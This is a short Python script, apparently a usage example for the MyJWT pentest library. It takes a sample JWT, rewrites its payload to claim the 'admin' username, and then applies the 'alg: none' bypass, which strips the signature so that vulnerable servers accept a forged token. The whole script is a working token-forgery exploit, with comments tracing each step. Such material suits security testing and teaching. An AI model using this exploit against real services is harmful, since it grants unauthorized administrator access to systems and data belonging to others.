from MyJWT.modifyJWT import changePayload
from MyJWT.utils import jwtToJson, SIGNATURE, encodeJwt
from MyJWT.vulnerabilities import noneVulnerability

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
jwtJson = jwtToJson(jwt)
jwtJson = changePayload(jwtJson, {"username": "admin"})
# "header" = {"typ": "JWT", "alg": "HS256"}
# "payload" = {"username": "admin"}
# "signature" = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

jwt = noneVulnerability(encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE])
# "header" = {"typ": "JWT", "alg": "none"}
# "payload" = {"username": "admin"}
# "signature" = ""
print(jwt)
